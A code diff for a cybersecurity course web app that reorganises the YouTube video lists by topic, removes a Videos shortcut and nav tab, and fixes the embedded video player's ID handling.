+<div class="vid-thumb" onclick="window._openVidPanel && window._openVidPanel('legal','Y373bTp1j3w')">
+  <img src="https://img.youtube.com/vi/Y373bTp1j3w/mqdefault.jpg" alt="PTP" loading="lazy">
+  <div class="play-overlay"><div class="play-btn-icon">&#9654;</div></div>
+  <div class="ch-label">PTP</div>
+</div>
+<div class="vid-thumb" onclick="window._openVidPanel && window._openVidPanel('legal','76fcelayw00')">
+  <img src="https://img.youtube.com/vi/76fcelayw00/mqdefault.jpg" alt="Prabh Nair" loading="lazy">
+  <div class="play-overlay"><div class="play-btn-icon">&#9654;</div></div>
+  <div class="ch-label">Prabh Nair</div>
+</div>
+</div>
   <div class="quiz">
     <h4>&#128221; Quick Quiz</h4>
     <p>What is the CFAA?</p>
@@ -10774,7 +11058,6 @@ Install-ADDSForest -DomainName corp.local
     <h3>&#9881; Keyboard Shortcuts</h3>
     <div class="shortcut-row"><span class="sc-label">Search</span><kbd>Ctrl + K</kbd></div>
     <div class="shortcut-row"><span class="sc-label">Terminal</span><kbd>Ctrl + `</kbd></div>
-    <div class="shortcut-row"><span class="sc-label">Videos</span><kbd>Ctrl + Shift + V</kbd></div>
     <div class="shortcut-row"><span class="sc-label">Previous section</span><kbd>Alt + &#8592;</kbd></div>
     <div class="shortcut-row"><span class="sc-label">Next section</span><kbd>Alt + &#8594;</kbd></div>
     <div class="shortcut-row"><span class="sc-label">Close panel</span><kbd>Esc</kbd></div>
@@ -10786,7 +11069,6 @@ Install-ADDSForest -DomainName corp.local
 <nav class="bottom-nav" id="bottomNav">
   <div class="bn-item active" data-tab="home"><span class="bn-icon">&#9670;</span>Home</div>
   <div class="bn-item" data-tab="modules"><span class="bn-icon">&#9776;</span>Topics</div>
-  <div class="bn-item" data-tab="videos"><span class="bn-icon">&#9654;</span>Videos</div>
   <div class="bn-item" data-tab="labs"><span class="bn-icon">&#9881;</span>Labs</div>
   <div class="bn-item" data-tab="progress"><span class="bn-icon">&#9733;</span>Progress</div>
 </nav>
@@ -10844,31 +11126,31 @@ const SEC=[
 ];
 
 const VIDS=[
-{id:'net',vids:[{vid:'Oielgo_hvRE',ch:'Networking Course'},{vid:'sWbUDq4S6Y8',ch:'freeCodeCamp'}]},
+{id:'foundations',vids:[{vid:'Oielgo_hvRE',ch:'Networking Course'},{vid:'sWbUDq4S6Y8',ch:'freeCodeCamp'}]},
 {id:'linux',vids:[{vid:'sWbUDq4S6Y8',ch:'freeCodeCamp'},{vid:'tKJhn2iVpXE',ch:'LearnLinuxTV'}]},
-{id:'web',vids:[{vid:'X4eRbHgRawI',ch:'freeCodeCamp'},{vid:'qiQRmQ7B8tM',ch:'HackerSploit'}]},
-{id:'osint',vids:[{vid:'qwA6MmbeGNo',ch:'The Cyber Mentor'},{vid:'LkA3H3caE8Y',ch:'John Hammond'}]},
+{id:'termux',vids:[{vid:'HElZqb3Mq1g',ch:'NetworkChuck'},{vid:'sWbUDq4S6Y8',ch:'freeCodeCamp'}]},
+{id:'networking',vids:[{vid:'Oielgo_hvRE',ch:'Networking Course'},{vid:'sWbUDq4S6Y8',ch:'freeCodeCamp'}]},
+{id:'recon',vids:[{vid:'qwA6MmbeGNo',ch:'The Cyber Mentor'},{vid:'LkA3H3caE8Y',ch:'John Hammond'}]},
+{id:'scanning',vids:[{vid:'wNA4CLG-OSM',ch:'whitesec'},{vid:'fNzpcB7ODxQ',ch:'The Cyber Mentor'}]},
+{id:'ethicalhack',vids:[{vid:'fNzpcB7ODxQ',ch:'The Cyber Mentor'},{vid:'TTw-EY7F1rM',ch:'Ryan John'}]},
+{id:'exploitation',vids:[{vid:'wNA4CLG-OSM',ch:'whitesec'},{vid:'fNzpcB7ODxQ',ch:'The Cyber Mentor'}]},
+{id:'bugbounty',vids:[{vid:'TTw-EY7F1rM',ch:'Ryan John'},{vid:'FqnSAa2KmBI',ch:'HackerOne'}]},
+{id:'tools',vids:[{vid:'sWbUDq4S6Y8',ch:'freeCodeCamp'},{vid:'HElZqb3Mq1g',ch:'NetworkChuck'}]},
+{id:'privesc',vids:[{vid:'wNA4CLG-OSM',ch:'whitesec'},{vid:'fNzpcB7ODxQ',ch:'The Cyber Mentor'}]},
+{id:'postexp',vids:[{vid:'56NDgBOSpUg',ch:'The Cyber Mentor'},{vid:'LH0Y4Y7yOhI',ch:'John Hammond'}]},
+{id:'websecurity',vids:[{vid:'X4eRbHgRawI',ch:'freeCodeCamp'},{vid:'qiQRmQ7B8tM',ch:'HackerSploit'}]},
+{id:'ossecurity',vids:[{vid:'v3iUx2SNspY',ch:'WsCube Cyber'},{vid:'S0V4aOmkNzY',ch:'The Cyber Mentor'}]},
 {id:'malware',vids:[{vid:'qA0YcYMRWyI',ch:'HuskyHacks'},{vid:'ePHChGthcvk',ch:'John Hammond'}]},
-{id:'cisco',vids:[{vid:'7zRkUa1eSOA',ch:'Go Cloud Architects'},{vid:'HElZqb3Mq1g',ch:'NetworkChuck'}]},
-{id:'pentest',vids:[{vid:'wNA4CLG-OSM',ch:'whitesec'},{vid:'fNzpcB7ODxQ',ch:'The Cyber Mentor'}]},
-{id:'cloud',vids:[{vid:'XsRBDJ5hcdg',ch:'Tech With Soleyman'},{vid:'IA2YqasHQhI',ch:'NetworkChuck'}]},
-{id:'netsec',vids:[{vid:'NqgqJj9bpWc',ch:'Network Security Course'},{vid:'kGHbmASJ4yU',ch:'The Cyber Mentor'}]},
-{id:'crypto',vids:[{vid:'C7vmouDOJYM',ch:'Simplilearn'},{vid:'H9KTK2s7NiY',ch:'NetworkChuck'}]},
-{id:'wireless',vids:[{vid:'wsa8N_lREN8',ch:'WsCube Cyber'},{vid:'XQrMK8m1vYc',ch:'NetworkChuck'}]},
 {id:'forensics',vids:[{vid:'jrYFwBU7Xrc',ch:'Simplilearn'},{vid:'McF3T8Z8n0M',ch:'John Hammond'}]},
-{id:'soc',vids:[{vid:'56NDgBOSpUg',ch:'The Cyber Mentor'},{vid:'BcMcM9bR1xc',ch:'John Hammond'}]},
-{id:'risk',vids:[{vid:'J-su239XmCE',ch:'Inside Cloud and Security'},{vid:'K3EJEO3mOGY',ch:'Prabh Nair'}]},
-{id:'ids',vids:[{vid:'druq1s-OkI4',ch:'Alpha Brains'},{vid:'VR2EdYqfmkg',ch:'Professor Messer'}]},
-{id:'incident',vids:[{vid:'MsGl6lX-YaI',ch:'Google Career Certs'},{vid:'4s454p6rXyI',ch:'The Cyber Mentor'}]},
-{id:'appsec',vids:[{vid:'ajLk4Hg0lCM',ch:'Simplilearn'},{vid:'JHfOArU0Y4k',ch:'HackerSploit'}]},
-{id:'blue',vids:[{vid:'56NDgBOSpUg',ch:'The Cyber Mentor'},{vid:'LH0Y4Y7yOhI',ch:'John Hammond'}]},
-{id:'red',vids:[{vid:'fNzpcB7ODxQ',ch:'The Cyber Mentor'},{vid:'d1fnoJfQpHo',ch:'HackerSploit'}]},
-{id:'hack',vids:[{vid:'TTw-EY7F1rM',ch:'Ryan John'},{vid:'FqnSAa2KmBI',ch:'HackerOne'}]},
-{id:'defence',vids:[{vid:'v3iUx2SNspY',ch:'WsCube Cyber'},{vid:'S0V4aOmkNzY',ch:'The Cyber Mentor'}]},
-{id:'ai',vids:[{vid:'aUfRHxeA15I',ch:'SANS Institute'},{vid:'XWuP5Yf5ILI',ch:'Python for Hackers'}]},
-{id:'privacy',vids:[{vid:'76fcelayw00',ch:'Prabh Nair'},{vid:'u2Kwc0YG7YQ',ch:'Professor Messer'}]},
+{id:'wireless',vids:[{vid:'wsa8N_lREN8',ch:'WsCube Cyber'},{vid:'XQrMK8m1vYc',ch:'NetworkChuck'}]},
+{id:'crypto',vids:[{vid:'C7vmouDOJYM',ch:'Simplilearn'},{vid:'H9KTK2s7NiY',ch:'NetworkChuck'}]},
+{id:'cloud',vids:[{vid:'XsRBDJ5hcdg',ch:'Tech With Soleyman'},{vid:'IA2YqasHQhI',ch:'NetworkChuck'}]},
+{id:'mobile',vids:[{vid:'qA0YcYMRWyI',ch:'HuskyHacks'},{vid:'ePHChGthcvk',ch:'John Hammond'}]},
+{id:'redteam',vids:[{vid:'fNzpcB7ODxQ',ch:'The Cyber Mentor'},{vid:'d1fnoJfQpHo',ch:'HackerSploit'}]},
+{id:'blueteam',vids:[{vid:'56NDgBOSpUg',ch:'The Cyber Mentor'},{vid:'LH0Y4Y7yOhI',ch:'John Hammond'}]},
+{id:'homelab',vids:[{vid:'v3iUx2SNspY',ch:'WsCube Cyber'},{vid:'kGHbmASJ4yU',ch:'The Cyber Mentor'}]},
 {id:'career',vids:[{vid:'gXKNHYTgFnA',ch:'The Cyber Mentor'},{vid:'EhJUfHSj9fM',ch:'Professor Messer'}]},
-{id:'legal',vids:[{vid:'Y373bTp1j3w',ch:'PTP'},{vid:'3zA8bC0eDfQ',ch:'Prabh Nair'}]}
+{id:'legal',vids:[{vid:'Y373bTp1j3w',ch:'PTP'},{vid:'76fcelayw00',ch:'Prabh Nair'}]}
 ];
 
 let cur='home';
@@ -11360,12 +11642,6 @@ document.addEventListener('keydown',function(e){
     if(panel.classList.contains('show')){if(window._closeTerminal)window._closeTerminal()}
     else{if(window._openTerminal)window._openTerminal()}
   }
-  if((e.ctrlKey||e.metaKey)&&e.shiftKey&&(e.key==='V'||e.key==='v')){
-    e.preventDefault();
-    var panel=document.getElementById('vidPanel');
-    if(panel.classList.contains('show')){panel.classList.remove('show');panel.classList.add('hide-anim');document.getElementById('vidFrame').src=''}
-    else{if(window._openVidPanel)window._openVidPanel(cur==='home'?'net':cur)}
-  }
   if(e.key==='?'&&!e.ctrlKey&&!e.metaKey&&!e.target.matches('input,textarea,select')){
     e.preventDefault();
     var sc=document.getElementById('shortcutModal');
@@ -11387,9 +11663,6 @@ function initBottomNav(){
         if(window.innerWidth<769){document.getElementById('sb').classList.add('open');document.getElementById('sOv').classList.add('show')}
       }
       else if(tab==='labs'){window.S('websecurity')}
-      else if(tab==='videos'){
-        if(window._openVidPanel){window._openVidPanel(cur==='home'?'net':cur)}
-      }
       else if(tab==='progress'){
         var first=Object.keys(done).length>0?Object.keys(done)[0]:null;
         if(first)window.S(first);else window.S('foundations');
@@ -11407,13 +11680,12 @@ function initVideoPlayer(){
   var placeholder=document.getElementById('vidPlaceholder');
   var titleEl=document.getElementById('vidPanelTitle');
   var drag=document.getElementById('vidDrag');
-  var tog=document.getElementById('vidTog');
   var closeBtn=document.getElementById('vidClose');
   var minBtn=document.getElementById('vidMin');
   var maxBtn=document.getElementById('vidMax');
   var resizeEl=document.getElementById('vidResize');
   var onlineDot=document.getElementById('onlineDot');
-  if(!panel||!tog)return;
+  if(!panel)return;
 
   function updateOnline(){
     if(navigator.onLine){onlineDot.className='online-dot on'}
@@ -11449,53 +11721,73 @@ function initVideoPlayer(){
     e.preventDefault();e.stopPropagation();
   });
 
-  tog.addEventListener('click',function(){
-    if(panel.classList.contains('show')){panel.classList.remove('show');panel.classList.add('hide-anim');frame.src=''}
-    else{panel.classList.remove('hide-anim');panel.classList.add('show');loadVidList(cur)}
-  });
-
   closeBtn.addEventListener('click',function(){
-    panel.classList.remove('show');panel.classList.add('hide-anim');frame.src='';
+    panel.classList.remove('show');
+    panel.classList.add('hide-anim');
+    frame.src='';
+    list.style.display='';
+    panel.style.height='';
+    panel.style.minHeight='';
+    panel.style.overflow='';
+    minimized=false;
+    if(panel.classList.contains('maximized'))panel.classList.remove('maximized');
   });
 
-  var minimized=false,prevStyle='';
+  var minimized=false;
   minBtn.addEventListener('click',function(){
-    if(!minimized){prevStyle=panel.style.cssText;list.style.display='none';panel.style.height='36px';panel.style.minHeight='36px';panel.style.overflow='hidden';minimized=true}
-    else{panel.style.cssText=prevStyle;list.style.display='';panel.style.minHeight='';panel.style.overflow='';minimized=false}
+    if(!minimized){
+      list.style.display='none';
+      panel.style.height='36px';
+      panel.style.minHeight='36px';
+      panel.style.overflow='hidden';
+      minimized=true;
+      minBtn.innerHTML='&#43;';
+      minBtn.title='Restore';
+    }else{
+      list.style.display='';
+      panel.style.height='';
+      panel.style.minHeight='';
+      panel.style.overflow='';
+      minimized=false;
+      minBtn.innerHTML='&#8722;';
+      minBtn.title='Minimize';
+    }
   });
 
   maxBtn.addEventListener('click',function(){
     panel.classList.toggle('maximized');
   });
 
-  function loadVidList(secId){
+  function loadVidList(secId,vidId){
     var vEntry=VIDS.find(function(v){return v.id===secId});
     var secEntry=SEC.find(function(s){return s.s===secId});
     titleEl.textContent=secEntry?secEntry.t.replace(/^\d+\.\s*/,''):'Videos';
     list.innerHTML='';
     if(!vEntry||!vEntry.vids.length){list.innerHTML='<div class="vid-empty" style="position:static;padding:20px">No videos available for this section</div>';return}
+    var playIdx=0;
+    if(vidId){var fi=vEntry.vids.findIndex(function(v){return v.vid===vidId});if(fi>=0)playIdx=fi}
     vEntry.vids.forEach(function(v,i){
       var item=document.createElement('div');
-      item.className='vid-item'+(i===0?' active':'');
+      item.className='vid-item'+(i===playIdx?' active':'');
       item.innerHTML='<span class="vi-play">&#9654;</span><div class="vi-info"><span class="vi-nam">'+v.ch+'</span><span class="vi-ch">YouTube</span></div>';
       item.addEventListener('click',function(){
         list.querySelectorAll('.vid-item').forEach(function(el){el.classList.remove('active')});
         item.classList.add('active');
         placeholder.style.display='none';
         frame.style.display='block';
-        frame.src='https://www.youtube.com/embed/'+v.id+'?autoplay=1&rel=0';
+        frame.src='https://www.youtube.com/embed/'+v.vid+'?autoplay=1&rel=0';
       });
       list.appendChild(item);
     });
     if(vEntry.vids.length>0){
       placeholder.style.display='none';frame.style.display='block';
-      frame.src='https://www.youtube.com/embed/'+vEntry.vids[0].id+'?autoplay=1&rel=0';
+      frame.src='https://www.youtube.com/embed/'+vEntry.vids[playIdx].vid+'?autoplay=1&rel=0';
     }
   }
 
-  window._openVidPanel=function(secId){
+  window._openVidPanel=function(secId,vidId){
     if(!panel.classList.contains('show')){panel.classList.remove('hide-anim');panel.classList.add('show')}
-    loadVidList(secId);
+    loadVidList(secId,vidId);
   };
 }
 
